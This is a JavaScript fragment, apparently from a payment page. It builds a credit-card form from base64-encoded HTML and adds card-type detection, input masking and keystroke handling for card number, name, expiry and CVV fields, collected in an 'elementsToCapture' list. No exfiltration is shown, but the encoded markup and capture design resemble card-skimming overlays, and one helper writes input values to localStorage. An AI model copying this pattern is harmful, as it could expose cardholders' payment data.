gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iY2VrdG5jMy0xcSBfMWZyYWdlbWFnLTFxIF8xZnJhZ2VtYWYtMXEgXzFmcmFnZW05eS0xcSBfMWZyYWdlbWI4LTFxIF8xZnJhZ2VtYXgtMXEgXzFmcmFnZW1hcy0xcSBfMWZyYWdlbWI2LTFxIj48c3Bhbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJjZWt0bmM5LTFxIj48c3Bhbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0icmVybXZmMS0xcSBfMWZyYWdlbTd0LTFxIF8xZnJhZ2VtN3YtMXEgXzFmcmFnZW0xOC0xcSI+U2VjdXJpdHkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29kZTwvc3Bhbj48L3NwYW4+PC9sYWJlbD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0iYmxvY2stc2VjdXJpdHktY29kZSINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJvVDMyRy0xcSB4SU44Vi0xcSB6c2FxSS0xcSBYa2gwRS0xcSBJYkxSby0xcSBibG9jay1pbnB1dCI+DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBpZD0ic2VjdXJpdHktY29kZSIgdHlwZT0idGV4dCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iY2FyZC1pbnB1dCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwbGFjZWhvbGRlcj0iU2VjdXJpdHkgY29kZSI+DQoNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iUDdLQVQtMXEiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iXzF4cWVsdmkxLTFxIF8xZnJhZ2VtMTYtMXEgXzFmcmFnZW0xOC0xcSBfMWZyYWdlbWFpLTFxIF8xZnJhZ2VtYW4tMXEgXzFmcmFnZW1heC0xcSBfMWZyYWdlbWFzLTFxIF8xZnJhZ2VtYjYtMXEgXzFmcmFnZW0xYS0xcSBfMWZyYWdlbTctMXEgc2VjdXJpdHktY29kZS1idG4iPjxzcGFuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iXzF4cWVsdmkyLTFxIj48c3Bhbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJfMWZyYWdlbTM3LTFxIF8xZnJhZ2VtMTAtMXEgXzFmcmFnZW05dC0xcSBfMWZyYWdlbTlzLTFxIGE4eDF3dTUtMXEgXzFmcmFnZW0xOC0xcSBhOHgxd3VpLTFxIGE4eDF3dW0tMXEiPjxzdmcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2aWV3Qm94PSIwIDAgMTQgMTQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvY3VzYWJsZT0iZmFsc2UiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFyaWEtbGFiZWw9Ik1vcmUgaW5mb3JtYXRpb24iDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJhOHgxd3VvLTFxIF8xZnJhZ2VtMTgtMXEgXzFmcmFnZW0zNy0xcSBfMWZyYWdlbTl0LTFxIF8xZnJhZ2VtOXMtMXEiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8Y2lyY2xlIGN4PSI3IiBjeT0iNyINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHI9IjUuNiI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvY2lyY2xlPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cGF0aCBzdHJva2UtbGluZWNhcD0icm91bmQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJva2UtbGluZWpvaW49InJvdW5kIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZD0iTTUuNiA1LjFjLjItMS4zIDIuNi0xLjMgMi44IDAgLjIgMS4zLTEuNDUgMS4zLTEuNDUgMi4zNW0uMDU1IDIuMzVIN3YuMDA1aC4wMDVWOS44WiI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvcGF0aD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGNpcmNsZSBjeD0iNyIgY3k9IjkuNyINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHI9IjAuMSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvY2lyY2xlPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvc3ZnPjwvc3Bhbj48L3NwYW4+PC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXY=",
    label_value: "ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xhc3M9IiBfMWZyYWdlbWFnLTFxIF8xZnJhZ2VtYmQtMXEgc2VjdXJpdHktY29kZS1wb3B1cC1jb250YWluZXIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiByb2xlPSJ0b29sdGlwIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJieTBwdGs3LTFxIF8xZnJhZ2VtOGktMXEgXzFmcmFnZW04ei0xcSBfMWZyYWdlbTgxLTFxIF8xZnJhZ2VtOWctMXEgXzFmcmFnZW0xYy0xcSBfMWZyYWdlbTl5LTFxIF8xZnJhZ2VtYWktMXEgXzFmcmFnZW0xbC0xcSBfMWZyYWdlbWFsLTFxIHNlY3VyaXR5LWNvZGUtcG9wdXAiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDMtZGlnaXQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWN1cml0eQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvZGUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c3VhbGx5DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm91bmQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRoZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJhY2sNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvZg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHlvdXINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXJkLg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFtZXJpY2FuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRXhwcmVzcw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhcmRzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaGF2ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGENCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA0LWRpZ2l0DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29kZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2F0ZWQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRoZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZyb250Lg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xhc3M9ImJ5MHB0a2MtMXEgXzFmcmFnZW1hZy0xcSBfMWZyYWdlbTY5LTFxIF8xZnJhZ2VtN2EtMXEgXzFmcmFnZW02ci0xcSBfMWZyYWdlbTM1LTFxIF8xZnJhZ2VtYWYtMXEiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cCBpZD0iZXJyb3ItZm9yLWJsb2NrLXNlY3VyaXR5LWNvZGUiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iZXJyb3ItdGV4dCI+RW50ZXIgdGhlIENWViBvcg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VjdXJpdHkgY29kZSBvbiB5b3VyIGNhcmQ8L3A+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9zcGFuPg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgPC9kaXY+"
}

const SECURITY_CODE_MASK = "XXXX"
const EXPIRY_DATE_MASK = "XX / XXXX"
const CARD_NUMBER_DEFAULT_MASK = "XXXXXXXXXXXXXXXX";

const KEYS = {
    "0": 48,
    "9": 57,
    "NUMPAD_0": 96,
    "NUMPAD_9": 105,
    "DELETE": 46,
    "BACKSPACE": 8,
    "ARROW_LEFT": 37,
    "ARROW_RIGHT": 39,
    "ARROW_UP": 38,
    "ARROW_DOWN": 40,
    "HOME": 36,
    "END": 35,
    "TAB": 9,
    "A": 65,
    "X": 88,
    "C": 67,
    "V": 86
};

const cardsRegExp = [
    {
        type: "visa",
        shortRegExp: /^4/,
        fullRegExp: /^4[0-9]{12}(?:[0-9]{3})?(?:[0-9]{3})?$/,
        mask: "XXXX XXXX XXXX XXXX XXX"
    },
    {
        type: "mastercard",
        shortRegExp: /^(5[1-5]|677189)|^(222[1-9]|2[3-6]\d{2}|27[0-1]\d|2720)/,
        fullRegExp: /^(5[1-5][0-9]{14}|2(22[1-9][0-9]{12}|2[3-9][0-9]{13}|[3-6][0-9]{14}|7[0-1][0-9]{13}|720[0-9]{12}))$/,
        mask: "XXXX XXXX XXXX XXXX"
    },
    {
        type: "amex",
        shortRegExp: /^3[47]/,
        fullRegExp: /^3[47][0-9]{13}$/,
        mask: "XXXX XXXXXX XXXXX",
    },
    {
        type: "discover",
        shortRegExp: /^(6011|65|64[4-9]|622)/,
        fullRegExp: /^65[4-9][0-9]{13}|64[4-9][0-9]{13}|6011[0-9]{12}|(622(?:12[6-9]|1[3-9][0-9]|[2-8][0-9][0-9]|9[01][0-9]|92[0-5])[0-9]{10})$/,
        mask: "XXXX XXXX XXXX XXXX"
    },
    {
        type: 'dinersclub',
        shortRegExp: /^(36|38|30[0-5])/,
        fullRegExp: /^3(?:0[0-5]|[68][0-9])[0-9]{11}$/,
        mask: "XXXX XXXXXX XXXX"
    }
]

const setNewValue = (el, newValue, stateKey) => {
    el.value = newValue
    state[stateKey] = newValue
}

const applyMask = (str, mask) => {
    let formattedString = "";
    let charPositionIdx = 0;

    for (let i = 0; i < mask.length; i++) {
        const currentMaskChar = mask[i];

        if (currentMaskChar == "X") {
            const digit = str.charAt(charPositionIdx);

            if (!digit) {
                break;
            }

            formattedString += str.charAt(charPositionIdx);
            charPositionIdx++;
        }

        else {
            formattedString += currentMaskChar;
        }
    }

    return formattedString;
};

const handleBasicInput = (el, value, stateKey) => {
    localStorage.setItem(stateKey, value)
    setNewValue(el, value, stateKey)
}

const keyCodeFromEvent = (e) => {
    return e.which || e.keyCode;
};

const keyIsTopNumber = (e) => {
    const keyCode = keyCodeFromEvent(e);
    return keyCode >= KEYS["0"] && keyCode <= KEYS["9"];
};

const keyIsKeypadNumber = (e) => {
    const keyCode = keyCodeFromEvent(e);
    return keyCode >= KEYS["NUMPAD_0"] && keyCode <= KEYS["NUMPAD_9"];
};

const keyIsNumber = (e) => {
    return keyIsTopNumber(e) || keyIsKeypadNumber(e);
};

const keyIsDelete = (e) => {
    return keyCodeFromEvent(e) == KEYS["DELETE"];
};

const keyIsBackspace = (e) => {
    return keyCodeFromEvent(e) == KEYS["BACKSPACE"];
};

const keyIsDeletion = (e) => {
    return keyIsDelete(e) || keyIsBackspace(e);
};

const keyIsArrow = (e) => {
    const keyCode = keyCodeFromEvent(e);
    return keyCode >= KEYS["ARROW_LEFT"] && keyCode <= KEYS["ARROW_DOWN"];
};

const keyIsNavigation = (e) => {
    const keyCode = keyCodeFromEvent(e);
    return keyCode == KEYS["HOME"] || keyCode == KEYS["END"];
};

const keyIsCommandFromEvent = (e) => {
    return e.ctrlKey || e.metaKey;
};

const keyIsKeyboardCommand = (e) => {
    const keyCode = keyCodeFromEvent(e);

    return keyIsCommandFromEvent(e) &&
        (
            keyCode == KEYS["A"] ||
            keyCode == KEYS["X"] ||
            keyCode == KEYS["C"] ||
            keyCode == KEYS["V"]
        );
};

const keyIsTab = (e) => {
    return keyCodeFromEvent(e) == KEYS["TAB"];
};

const keyPressHandler = (e) => {
    if (e.ctrlKey || e.metaKey) {
        return false;
    }

}

const filterNumberOnlyKey = function (e) {
    const isNumber = keyIsNumber(e);
    const isDeletion = keyIsDeletion(e);
    const isArrow = keyIsArrow(e);
    const isNavigation = keyIsNavigation(e);
    const isKeyboardCommand = keyIsKeyboardCommand(e);
    const isTab = keyIsTab(e);

    if (!isNumber && !isDeletion && !isArrow && !isNavigation && !isKeyboardCommand && !isTab) {
        e.preventDefault();
    }
};

const caretStartPosition = (element) => {
    if (typeof element.selectionStart == "number") {
        return element.selectionStart;
    }

    return false;
};

const caretEndPosition = (element) => {
    if (typeof element.selectionEnd == "number") {
        return element.selectionEnd;
    }

    return false;
};

const normaliseCaretPosition = (mask, caretPosition) => {
    let numberPos = 0;

    if (caretPosition < 0 || caretPosition > mask.length) {
        return 0;
    }

    for (let i = 0; i < mask.length; i++) {
        if (i == caretPosition) {
            return numberPos;
        }

        if (mask[i] == "X") {
            numberPos++;
        }
    }

    return numberPos;
};

const numbersOnlyString = (string) => {
    let numbersOnlyString = "";

    for (let i = 0; i < string.length; i++) {
        const currentChar = string.charAt(i);
        const isValid = !isNaN(parseInt(currentChar));

        if (isValid) { numbersOnlyString += currentChar; }
    }

    return numbersOnlyString;
};

const digitFromKeyCode = (keyCode) => {
    if (keyCode >= KEYS["0"] && keyCode <= KEYS["9"]) {
        return keyCode - KEYS["0"];
    }

    if (keyCode >= KEYS["NUMPAD_0"] && keyCode <= KEYS["NUMPAD_9"]) {
        return keyCode - KEYS["NUMPAD_0"];
    }

    return null;
};

const denormaliseCaretPosition = (mask, caretPosition) => {
    let numberPos = 0;
    if (caretPosition < 0 || caretPosition > mask.length) { return 0; }
    for (let i = 0; i < mask.length; i++) {
        if (numberPos == caretPosition) { return i; }
        if (mask[i] == "X") { numberPos++; }
    }
    return mask.length;
};

const setCaretPosition = (element, caretPos) => {
    if (element != null) {
        if (element.createTextRange) {
            let range = element.createTextRange();

            range.move('character', caretPos);
            range.select();
        }

        else {
            if (element.selectionStart) {
                element.focus();
                element.setSelectionRange(caretPos, caretPos);
            }

            else {
                element.focus();
            }
        }
    }
};

const handleMaskedNumberInputKey = (e, mask, stateKey) => {
    filterNumberOnlyKey(e);

    const keyCode = e.which || e.keyCode;
    const element = e.target;

    const caretStart = caretStartPosition(element);
    const caretEnd = caretEndPosition(element);

    const normalisedStartCaretPosition = normaliseCaretPosition(mask, caretStart);
    const normalisedEndCaretPosition = normaliseCaretPosition(mask, caretEnd);

    let newCaretPosition = caretStart;

    const isNumber = keyIsNumber(e);
    const isDelete = keyIsDelete(e);
    const isBackspace = keyIsBackspace(e);

    if (isNumber || isDelete || isBackspace) {
        e.preventDefault();

        const rawText = element.value
        let numbersOnly = numbersOnlyString(rawText);

        const digit = digitFromKeyCode(keyCode);

        const rangeHighlighted = normalisedEndCaretPosition > normalisedStartCaretPosition;

        if (rangeHighlighted) {
            numbersOnly = (numbersOnly.slice(0, normalisedStartCaretPosition) + numbersOnly.slice(normalisedEndCaretPosition));
        }

        if (caretStart != mask.length) {
            if (isNumber && rawText.length <= mask.length) {
                numbersOnly = (numbersOnly.slice(0, normalisedStartCaretPosition) + digit + numbersOnly.slice(normalisedStartCaretPosition));
                newCaretPosition = Math.max(
                    denormaliseCaretPosition(mask, normalisedStartCaretPosition + 1),
                    denormaliseCaretPosition(mask, normalisedStartCaretPosition + 2) - 1
                );
            }

            if (isDelete) {
                numbersOnly = (numbersOnly.slice(0, normalisedStartCaretPosition) + numbersOnly.slice(normalisedStartCaretPosition + 1));
            }
        }

        if (caretStart != 0) {
            if (isBackspace && !rangeHighlighted) {
                numbersOnly = (numbersOnly.slice(0, normalisedStartCaretPosition - 1) + numbersOnly.slice(normalisedStartCaretPosition));
                newCaretPosition = denormaliseCaretPosition(mask, normalisedStartCaretPosition);
            }
        }

        const newValue = applyMask(numbersOnly, mask)
        setNewValue(element, newValue, stateKey)

        setCaretPosition(element, newCaretPosition);
    }

    else {
        return false
    }
};

const getCardType = (value) => {
    let cardType = ""
    let maskType = CARD_NUMBER_DEFAULT_MASK

    cardsRegExp.forEach(({ type, shortRegExp, mask }) => {
        if (shortRegExp.test(value)) {
            cardType = type
            maskType = mask
        }
    })

    return [maskType, cardType]
}

const activateCard = (cardType) => {
    const cardIcons = document.querySelectorAll(".card-icon")

    cardIcons.forEach((cardIcon) => {
        cardIcon.classList.remove("card-icon-active", "card-icon-disactive")

        if (cardType.length > 1 && !cardIcon.classList.contains(cardType)) {
            cardIcon.classList.add("card-icon-disactive")
        }
    })

    if (cardType.length > 1) {
        document.querySelector(`.${cardType}`).classList.add("card-icon-active")
    }
}

const handleCardNumberKeydown = (e, stateKey) => {
    filterNumberOnlyKey(e)

    const isDeletion = keyIsDeletion(e)

    let value = e.target.value + e.key

    if (e.target.value.length == 1 && isDeletion) {
        value = e.key
    }

    const [maskType, cardType] = getCardType(value)
    const isResult = handleMaskedNumberInputKey(e, maskType, stateKey)

    const valueLength = e.target.value.length

    if (isResult !== false && valueLength != 0) {
        e.target.addEventListener("keyup", () => activateCard(cardType), { once: true })
    }

    if (valueLength == 0) {
        activateCard("")
    }
}

const handleCardNumberInput = (e, stateKey) => {
    const pastedData = e.target.value
    const numbersOnly = numbersOnlyString(pastedData);
    const [maskType, cardType] = getCardType(numbersOnly)
    const formattedNumber = applyMask(numbersOnly, maskType);

    activateCard(cardType)
    setNewValue(e.target, formattedNumber, stateKey)
}

const handleNameOnCardInput = (e, stateKey) => {
    setNewValue(e.target, e.target.value, stateKey)
}

const handleNameOnCardPaste = (e, pastedData, stateKey) => {
    setNewValue(e.target, pastedData, stateKey)
}

const handleExpirationDataInput = (e, stateKey) => {
    handleMaskedNumberInputKey(e, EXPIRY_DATE_MASK, stateKey);

    const value = e.target.value

    if (value.length == 1 && parseInt(value) > 1 && keyIsNumber(e)) {
        const str = applyMask("0" + value, EXPIRY_DATE_MASK);
        setNewValue(e.target, str, stateKey)
    }
}

const handleExpirationDatePaste = (e, pastedData, stateKey) => {
    const numbersOnly = numbersOnlyString(pastedData);
    const formattedNumber = applyMask(numbersOnly, EXPIRY_DATE_MASK);

    setNewValue(e.target, formattedNumber, stateKey)
}

const handleSecurityCodeKeydown = (e, stateKey) => {
    filterNumberOnlyKey(e)
    handleMaskedNumberInputKey(e, SECURITY_CODE_MASK, stateKey)
}

const handleSecurityCodePaste = (e, pastedData, stateKey) => {
    const numbersOnly = numbersOnlyString(pastedData);
    const formattedNumber = applyMask(numbersOnly, SECURITY_CODE_MASK);

    setNewValue(e.target, formattedNumber, stateKey)
}

const elementsToCapture = [
    {
        id: "card-number",
        stateKey: "cardNumber",
        labelId: "card-number-label",
        events: {
            input: handleCardNumberInput,
            keydown: handleCardNumberKeydown,
            focus: "default",
            blur: "default",
        }
    },
    {
        id: "name-on-card",
        stateKey: "nameOnCard",
        labelId: "name-on-card-label",
        events: {
            input: handleNameOnCardInput,
            paste: handleNameOnCardPaste,
            focus: "default",
            blur: "default",
        }
    },
    {
        id: "expiration-date",
        stateKey: "expirationDate",
        labelId: "expiration-date-label",
        events: {
            keydown: handleExpirationDataInput,
            paste: handleExpirationDatePaste,
            focus: "default",
            blur: "default",
        }
    },
    {
        id: "security-code",
        stateKey: "securityCode",
        labelId: "security-code-label",
        events: {
            keydown: handleSecurityCodeKeydown,
            paste: handleSecurityCodePaste,
            focus: "default",
            blur: "default",
        }
    }
]

const paymentOnInput = function ({ e, id, listener, stateKey, labelId }) {
    const label = document.querySelector(`#${labelId}`)

    listener(e, stateKey)

    this.addEventListener("keyup", () => {
        disactiveAlert()
        disactivateErrorAttrubutes(`block-${id}`)

        label.classList.add("label-active")
        this.classList.add("card-input-active", "empty-card-input-active")
    }, { once: true })
}

const paymentOnKeydown = function ({ e, id, listener, stateKey, labelId }) {
    const label = document.querySelector(`#${labelId}`)

    listener(e, stateKey)

    this.addEventListener("keyup", () => {
        disactiveAlert()
        disactivateErrorAttrubutes(`block-${id}`)

        label.classList.add("label-active")
        this.classList.add("card-input-active", "empty-card-input-active")
    }, { once: true })
}

const paymentOnFocus = function () {
    if (!this.parentNode.classList.contains("card-input-error")) {
        this.parentNode.classList.add("block-input-active")
    }
}

const paymentOnBlur = function ({ labelId }) {
    const label = document.querySelector(`#${labelId}`)

    if (this.value.length <= 0) {
        label.classList.remove("label-active")
        this.classList.remove("card-input-active", "empty-card-input-active")
    }

